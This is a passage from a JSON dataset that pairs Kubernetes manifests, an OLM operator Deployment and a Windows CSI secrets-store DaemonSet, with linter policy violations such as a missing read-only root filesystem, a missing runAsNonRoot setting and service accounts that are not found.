8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"olm-operator\" does not have a read-only root file system"
  },
  {
    "id": "1762",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"olm-operator-serviceaccount\" not found"
  },
  {
    "id": "1763",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"olm-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "1764",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"olm-operator\" has memory limit 0"
  },
  {
    "id": "1765",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "1766",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "1767",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"secrets-store\" does not have a read-only root file system"
  },
  {
    "id": "1768",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"secrets-store-csi-driver\" not found"
  },
  {
    "id": "1769",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "1770",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "1771",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
